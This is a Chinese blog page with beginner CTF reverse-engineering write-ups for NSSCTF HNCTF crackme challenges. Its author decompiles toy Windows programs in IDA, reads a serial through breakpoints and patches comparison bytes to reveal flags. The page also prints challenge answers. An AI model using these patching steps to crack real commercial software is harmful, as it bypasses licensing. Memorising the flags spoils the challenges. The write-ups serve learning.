<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_4020C0</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  result = a1 - <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 - <span class="number">4</span> &gt; <span class="number">60</span> )</span><br><span class="line">    result = isFlag++ + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>果然发现了
“60”，然后就是对其进行修改，在左侧函数栏中找到<code>sub_4020C0()</code>函数，切换到
text view 状态</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:00401C1C ; __unwind {</span><br><span class="line">.text:00401C1C                 push    ebp</span><br><span class="line">.text:00401C1D                 mov     ebp, esp</span><br><span class="line">.text:00401C1F                 mov     eax, [ebp+arg_0]</span><br><span class="line">.text:00401C22                 sub     eax, 4</span><br><span class="line">.text:00401C25                 cmp     eax, 3Ch     &lt;------3Ch转换为10进制为60</span><br><span class="line">.text:00401C28                 jle     short loc_401C37</span><br><span class="line">.text:00401C2A                 mov     eax, ds:_isFlag</span><br><span class="line">.text:00401C2F                 add     eax, 1</span><br><span class="line">.text:00401C32                 mov     ds:_isFlag, eax</span><br></pre></td></tr></tbody></table></figure>
<p>在 Hex View 中找到对应的地址，找到 3C 所在的位置</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220929210757529.png" alt="image-20220929210757529">
<figcaption aria-hidden="true">image-20220929210757529</figcaption>
</figure>
<p>右键进行修改，改为<code>01</code>，然后通过下面的操作进行保存</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220929210917237.png" alt="image-20220929210917237">
<figcaption aria-hidden="true">image-20220929210917237</figcaption>
</figure>
<p>再次运行该程序，得了两分后直接撞墙退出游戏，发现flag</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220929211044604.png" alt="image-20220929211044604">
<figcaption aria-hidden="true">image-20220929211044604</figcaption>
</figure>
<p><code>NSSCTF{YourAreTheMasterOfGame!}</code></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/10/NSSCTF-HNCTF(%E8%87%AA%E7%94%B1%E8%B5%9B%E9%81%93)/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/10/NSSCTF-HNCTF(%E8%87%AA%E7%94%B1%E8%B5%9B%E9%81%93)/" class="post-title-link" itemprop="url">NSSCTF-HNCTF(自由赛道)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-06-10 15:50:06" itemprop="dateCreated datePublished" datetime="2023-06-10T15:50:06+08:00">2023-06-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reverse/" itemprop="url" rel="index"><span itemprop="name">Reverse</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>4.4k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>4 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>平台：NSSCTF</p>
<p>比赛：HNCTF(自由赛道)</p>
<h2 id="crackme">CrackMe</h2>
<p>附件名称为：动调下断点。可知这题应该使用动态调试。</p>
<p>先使用IDA打开文件，查看文件信息。按 shift+F12
查看是否有特殊字符串</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221021200456398.png" alt="image-20221021200456398">
<figcaption aria-hidden="true">image-20221021200456398</figcaption>
</figure>
<p>双击<code>.data:00403096   00000016    C   Congrats, u did it!!!</code>，定位到该字符串下，右击查看该字符串所在的函数</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221021200815897.png" alt="image-20221021200815897">
<figcaption aria-hidden="true">image-20221021200815897</figcaption>
</figure>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221021200830149.png" alt="image-20221021200830149">
<figcaption aria-hidden="true">image-20221021200830149</figcaption>
</figure>
<p>发现是在 DialogFunc 函数中，点击左侧函数名查看该函数</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221021201601938.png" alt="image-20221021201601938">
<figcaption aria-hidden="true">image-20221021201601938</figcaption>
</figure>
<p>分析视图逻辑，发现在打印最终的字符串之前进行了字符串的判断，猜测其中一个是flag</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221021203157203.png" alt="image-20221021203157203">
<figcaption aria-hidden="true">image-20221021203157203</figcaption>
</figure>
<p>双击查看这两个字符串的地址</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221021203453448.png" alt="image-20221021203453448">
<figcaption aria-hidden="true">image-20221021203453448</figcaption>
</figure>
<p>回到动态调试中，发现这两个字符串</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221021203549793.png" alt="image-20221021203549793">
<figcaption aria-hidden="true">image-20221021203549793</figcaption>
</figure>
<p>在第一个 String 处设置断点（F2），然后按 F9
运行至断点处，弹出窗口要求我们进行输入，根据附件中的“要求.txt”，我在
name 框中输入了“CreakMe”，按下“Check”按钮后，查看 String 内容</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221021204246992.png" alt="image-20221021204246992">
<figcaption aria-hidden="true">image-20221021204246992</figcaption>
</figure>
<p>窗口提示输入“Serial”，我便随便输入了几个数字，点击“About”按钮，然后按F8单步执行，无法成功，于是再次按下“Check”按钮，并再次尝试运行，单步执行成功，第一个
String 和第二个均发生了改变，第二个 String 内容为我刚输入的内容</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221021204726038.png" alt="image-20221021204726038">
<figcaption aria-hidden="true">image-20221021204726038</figcaption>
</figure>
<p>猜测第一个 String 的内容为flag，尝试提交，flag正确。</p>
<h2 id="getflag">getflag</h2>
<p>使用IDA打开文件，直接F5查看伪代码</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  LPSTR v3; <span class="comment">// ebx</span></span><br><span class="line">  CHAR v4; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// esi</span></span><br><span class="line">  HMODULE v6; <span class="comment">// eax</span></span><br><span class="line">  LPSTR v8; <span class="comment">// edx</span></span><br><span class="line">  CHAR v9; <span class="comment">// al</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFOA</span> <span class="title">StartupInfo</span>;</span> <span class="comment">// [esp+0h] [ebp-5Ch]</span></span><br><span class="line">  <span class="type">int</span> *v11; <span class="comment">// [esp+50h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v11 = &amp;argc;</span><br><span class="line">  __main();</span><br><span class="line">  v3 = GetCommandLineA();</span><br><span class="line">  GetStartupInfoA(&amp;StartupInfo);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      v4 = *v3;</span><br><span class="line">      <span class="keyword">if</span> ( *v3 != <span class="number">32</span> &amp;&amp; v4 != <span class="number">9</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ++v3;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">34</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      {</span><br><span class="line">        v8 = v3++;</span><br><span class="line">        v9 = *v3;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">while</span> ( *v3 != <span class="number">34</span> &amp;&amp; v9 );</span><br><span class="line">      <span class="keyword">if</span> ( v9 == <span class="number">34</span> )</span><br><span class="line">        v3 = v8 + <span class="number">2</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">while</span> ( *v3 &amp; <span class="number">0xDF</span> &amp;&amp; *v3 != <span class="number">9</span> )</span><br><span class="line">        ++v3;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">while</span> ( *v3 == <span class="number">32</span> || *v3 == <span class="number">9</span> )</span><br><span class="line">      ++v3;</span><br><span class="line">  }</span><br><span class="line">  v5 = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">if</span> ( StartupInfo.dwFlags &amp; <span class="number">1</span> )</span><br><span class="line">    v5 = StartupInfo.wShowWindow;</span><br><span class="line">  v6 = GetModuleHandleA(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> WinMain(v6, <span class="number">0</span>, v3, v5);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>发现第13行的 _main() 函数，双击查看</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __main()</span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  result = dword_40802C;</span><br><span class="line">  <span class="keyword">if</span> ( !dword_40802C )</span><br><span class="line">  {</span><br><span class="line">    dword_40802C = <span class="number">1</span>;</span><br><span class="line">    result = __do_global_ctors();</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>没发现什么重要的函数，于是尝试运行该程序，发现需要点击 100000000
次鼠标才能得到flag。（还是算了吧）</p>
<p>于是回到 main 函数中，跳过一些系统调用的函数，双击查看第48行的
WinMain 函数</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, <span class="type">int</span> nShowCmd)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  MSG Msg; <span class="comment">// [esp+34h] [ebp-54h]</span></span><br><span class="line">  WNDCLASSA WndClass; <span class="comment">// [esp+50h] [ebp-38h]</span></span><br><span class="line">  HWND v8; <span class="comment">// [esp+78h] [ebp-10h]</span></span><br><span class="line">  HWND hWnd; <span class="comment">// [esp+7Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  WndClass.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">  WndClass.cbWndExtra = <span class="number">0</span>;</span><br><span class="line">  WndClass.hbrBackground = (HBRUSH)<span class="number">6</span>;</span><br><span class="line">  WndClass.hCursor = <span class="number">0</span>;</span><br><span class="line">  WndClass.hIcon = <span class="number">0</span>;</span><br><span class="line">  WndClass.hInstance = hInstance;</span><br><span class="line">  WndClass.lpfnWndProc = WndProc;</span><br><span class="line">  WndClass.lpszClassName = <span class="string">"Main"</span>;</span><br><span class="line">  WndClass.lpszMenuName = <span class="number">0</span>;</span><br><span class="line">  WndClass.style = <span class="number">42</span>;</span><br><span class="line">  RegisterClassA(&amp;WndClass);</span><br><span class="line">  hWnd = GetForegroundWindow();</span><br><span class="line">  ShowWindow(hWnd, <span class="number">0</span>);</span><br><span class="line">  v8 = CreateWindowExA(<span class="number">0</span>, <span class="string">"Main"</span>, <span class="string">"flag"</span>, <span class="number">0xCF0000</span>u, <span class="number">200</span>, <span class="number">200</span>, <span class="number">430</span>, <span class="number">130</span>, <span class="number">0</span>, <span class="number">0</span>, hInstance, <span class="number">0</span>);</span><br><span class="line">  ShowWindow(v8, <span class="number">5</span>);</span><br><span class="line">  UpdateWindow(v8);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  {</span><br><span class="line">    *(HWND *)((<span class="type">char</span> *)&amp;Msg.hwnd + v4) = <span class="number">0</span>;</span><br><span class="line">    v4 += <span class="number">4</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">while</span> ( v4 &lt; <span class="number">0x1C</span> );</span><br><span class="line">  <span class="keyword">while</span> ( GetMessageA(&amp;Msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) )</span><br><span class="line">  {</span><br><span class="line">    TranslateMessage(&amp;Msg);</span><br><span class="line">    DispatchMessageA(&amp;Msg);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>双击查看 WndProc 函数</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">WndProc</span><span class="params">(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">{</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tagRECT</span> <span class="title">Rect</span>;</span> <span class="comment">// [esp+3Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tagPAINTSTRUCT</span> <span class="title">Paint</span>;</span> <span class="comment">// [esp+4Ch] [ebp-4Ch]</span></span><br><span class="line">  HDC hDC; <span class="comment">// [esp+8Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( Msg == <span class="number">15</span> )</span><br><span class="line">  {</span><br><span class="line">    hDC = BeginPaint(hWnd, &amp;Paint);</span><br><span class="line">    GetClientRect(hWnd, &amp;Rect);</span><br><span class="line">    DrawTextA(hDC, <span class="string">"Click to get the flag."</span>, <span class="number">-1</span>, &amp;Rect, <span class="number">0x85</span>u);</span><br><span class="line">    EndPaint(hWnd, &amp;Paint);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( Msg &gt; <span class="number">0xF</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( Msg != <span class="number">16</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( Msg == <span class="number">273</span> )</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span> ( wParam == <span class="number">1234</span> )</span><br><span class="line">          OnButtonClick();</span><br><span class="line">        <span class="keyword">if</span> ( wParam == <span class="number">4321</span> )</span><br><span class="line">          check();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">    }</span><br><span class="line">    DestroyWindow(hWnd);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( Msg == <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    CreateWindowExA(</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      <span class="string">"button"</span>,</span><br><span class="line">      <span class="string">"Click me."</span>,</span><br><span class="line">      <span class="number">0x50000000</span>u,</span><br><span class="line">      <span class="number">80</span>,</span><br><span class="line">      <span class="number">30</span>,</span><br><span class="line">      <span class="number">120</span>,</span><br><span class="line">      <span class="number">30</span>,</span><br><span class="line">      hWnd,</span><br><span class="line">      (HMENU)<span class="number">0x4D2</span>,</span><br><span class="line">      *(HINSTANCE *)(lParam + <span class="number">4</span>),</span><br><span class="line">      <span class="number">0</span>);</span><br><span class="line">    CreateWindowExA(</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      <span class="string">"button"</span>,</span><br><span class="line">      <span class="string">"Get flag"</span>,</span><br><span class="line">      <span class="number">0x50000000</span>u,</span><br><span class="line">      <span class="number">220</span>,</span><br><span class="line">      <span class="number">30</span>,</span><br><span class="line">      <span class="number">120</span>,</span><br><span class="line">      <span class="number">30</span>,</span><br><span class="line">      hWnd,</span><br><span class="line">      (HMENU)<span class="number">0x10E1</span>,</span><br><span class="line">      *(HINSTANCE *)(lParam + <span class="number">4</span>),</span><br><span class="line">      <span class="number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( Msg != <span class="number">2</span> )</span><br><span class="line">    {</span><br><span class="line">LABEL_17:</span><br><span class="line">      DefWindowProcA(hWnd, Msg, wParam, lParam);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    MessageBoxA(<span class="number">0</span>, <span class="string">"Never gonna give you up."</span>, <span class="string">"Rick"</span>, <span class="number">0</span>);</span><br><span class="line">    PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>分析代码可确定最主要的代码就在这个函数中，双击查看 check() 函数</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int check()</span><br><span class="line">{</span><br><span class="line">  if ( click &gt; 99999999 )</span><br><span class="line">    return getflag();</span><br><span class="line">  sprintf(chk, "Click %d more times to get flag", 100000000 - click);</span><br><span class="line">  return MessageBoxA(0, chk, "Failed", 0);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>发现最重要的判断语句，只需要修改点击次数就能快速获得flag。</p>
<p>回到 IDA View-A 窗口，点击 _check 函数</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221021210814755.png" alt="image-20221021210814755">
<figcaption aria-hidden="true">image-20221021210814755</figcaption>
</figure>
<p>点击空格键切换视图模式</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221021210910536.png" alt="image-20221021210910536">
<figcaption aria-hidden="true">image-20221021210910536</figcaption>
</figure>
<p>在 Hex 窗口中找到该地址</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221021211008946.png" alt="image-20221021211008946">
<figcaption aria-hidden="true">image-20221021211008946</figcaption>
</figure>
<p>右击选择 Edit
，修改为<code>01 00 00 00</code>，注意内存中的存储顺序。然后通过下图进行保存</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221021211427569.png" alt="image-20221021211427569">
<figcaption aria-hidden="true">image-20221021211427569</figcaption>
</figure>
<p>运行修改后的程序，点击一次 Click me 按钮，再点击 Get flag
按钮得到flag。</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221021211650450.png" alt="image-20221021211650450">
<figcaption aria-hidden="true">image-20221021211650450</figcaption>
</figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/13/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><span class="page-number current">14</span><a class="page-number" href="/page/15/">15</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/15/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="hxt"
      src="/images/hxt.jpg">
  <p class="site-author-name" itemprop="name">hxt</p>
  <div class="site-description" itemprop="description">May the Force be with you.</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">176</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">41</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">68</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">hxt</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">389k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">5:53</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
